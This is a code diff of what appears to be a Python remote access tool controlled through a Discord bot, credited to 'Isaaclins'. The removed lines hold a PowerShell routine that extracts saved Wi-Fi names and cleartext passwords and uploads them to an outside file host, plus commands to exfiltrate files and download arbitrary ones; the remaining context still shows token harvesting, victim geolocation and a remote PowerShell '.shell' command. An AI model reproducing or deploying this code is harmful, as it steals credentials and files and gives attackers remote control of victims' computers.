@@ -25,8 +25,8 @@ from comtypes import CLSCTX_ALL
 from ctypes import cast, POINTER
 
 
-file_api = "https://api.letsupload.cc/upload"
-wifi_script = """(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASSWORD=$pass }} | Format-Table -AutoSize"""
+guild_id=123
+bot_token=456
 global embedMessageWhenStarted
 
 tokens = []
@@ -212,16 +212,6 @@ mac_address = str(get_mac())
 @client.event
 async def on_ready():
     getTokenAndSearchForInfo()
-    try:
-        output = subprocess.Popen(["powershell.exe", wifi_script], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()[0]
-        decoded_wifi_pwd = output.decode(sys.stdout.encoding, errors='ignore')
-        file_name = f"SSID_{mac_address}.txt"
-        with open(file_name, 'w') as file:
-            file.write(decoded_wifi_pwd)
-        SSIDlink = requests.post(file_api, files={"file": open(file_name, "rb")}).json()["data"]["file"]["url"]["full"]
-        os.remove(file_name)
-    except Exception as e:
-        SSIDlink = None
     response = requests.get('https://ipapi.co/json/')
     data = response.json()
     city = data.get('city')
@@ -245,10 +235,6 @@ async def on_ready():
     embedMessageWhenStarted.add_field(name="**Aprox. Longitude**",value=f"```{longitude}```",inline=True)
     embedMessageWhenStarted.add_field(name="**City:**",value=f"```{city}```",inline=True)
     embedMessageWhenStarted.add_field(name="**Username:**",value=f"```{username}```",inline=True)
-    try:
-        embedMessageWhenStarted.add_field(name="**SSID & Passwords:**",value=f"{SSIDlink}",inline=True)
-    except Exception as err:
-        embedMessageWhenStarted.add_field(name="**SSID & Passwords:**",value=f"ERROR: Not able to extract. error message: \n {err}",inline=True)
     embedMessageWhenStarted.set_image(url="https://cdn.discordapp.com/emojis/962763241170284554.gif?size=128&quality=lossless")
     embedMessageWhenStarted.set_thumbnail(url="https://cdn.discordapp.com/emojis/824891158936682506.gif?size=128&quality=lossless")
     embedMessageWhenStarted.set_footer(text="Made by: Isaaclins",icon_url="https://cdn.discordapp.com/emojis/696329906749177856.gif?size=128&quality=lossless")
@@ -433,26 +419,9 @@ async def on_message(message):
                     await message.reply("changed wallpaper")
 
 
-            if message.content.lower().startswith(".export"):
-                file = message.content[8:]
-                try:
-                    link = requests.post(file_api, files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
-                    embed = discord.Embed(title="Export", description=f"```{link}```", color=0xfafafa)
-                    await message.reply(embed=embed)
-                except:
-                    embed = discord.Embed(title="Error", description=f"```File Not Found```", color=0xfafafa)
-                    await message.reply(embed=embed)
-            elif message.content.lower().startswith(".upload"):
-                link = message.content[8:]
-                file = requests.get(link).content
-                file_name = os.path.basename(link)
-                file_name = file_name.rsplit('_', 1)[0] + '.' + file_name.rsplit('_', 1)[1]
-                with open(file_name, "wb") as f:
-                    f.write(file)
-                embed = discord.Embed(title="Upload", description=f"```{file_name}```", color=0xfafafa)
-                await message.reply(embed=embed)
-                await message.delete()
-            elif message.content.lower().startswith(".shell"):
+            
+            
+            if message.content.lower().startswith(".shell"):
                 command = message.content[7:]
                 output = subprocess.Popen(
                     ["powershell.exe", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
